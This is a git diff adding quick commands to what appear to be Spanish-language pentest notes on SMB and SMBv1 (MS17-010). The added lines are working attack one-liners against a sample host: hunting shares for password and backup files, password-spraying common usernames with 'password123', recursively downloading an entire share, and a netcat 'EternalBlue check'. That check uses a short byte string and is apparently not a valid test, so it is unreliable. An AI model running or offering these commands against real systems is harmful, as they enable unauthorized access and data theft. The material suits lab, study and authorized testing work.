@@ -26,7 +26,30 @@ SMB v1 (Server Message Block versión 1), inseguro y obsoleto para compartir arc
 - nxc smb 10.0.0.1
 - smbclient -L //10.0.0.1/ -m NT1  
 - nmap -Pn -sVC -p 139,445 10.0.0.1 --script smb-vuln-ms17-010
+
+**otros comandos rapidos**
 - sudo mount -t cifs //10.0.0.1/Public /mnt -o guest
+
+- Busca archivos específicos en shares
+
+for share in $(smbclient -L //192.168.1.100 -N 2>/dev/null | awk '/Disk/ {print $1}'); do
+    echo "Buscando en $share:"
+    smbclient -N //192.168.1.100/$share -c "ls *pass*; ls *backup*" 2>/dev/null
+done
+
+- Fuerza bruta SIMPLE con una sola password
+
+for user in admin administrator guest test; do
+    echo -n "Probando $user:password123... "
+    smbclient -L //192.168.1.100 -U "$user%password123" 2>&1 | grep -q "session setup failed" && echo "FAIL" || echo "OK"
+done
+
+- Descarga TODO de un share (si tienes acceso)
+
+smbclient -U "user%pass" //192.168.1.100/ShareName -c "prompt OFF; recurse ON; mget *"
+
+- Chequeo rápido de EternalBlue (sin herramientas especiales)
+echo -e "\x00\x00\x00\x90\xff\x53\x4d\x42\x25\x00" | nc -w1 192.168.1.100 445 | hexdump -C | head -5
 
 **SMBv1:** vulnerabilidad CVE-2017-0143, gravedad 8.8, de ejecucion remota de codigo (RCE), en Windows con SMBv1 (ms17-010)
 
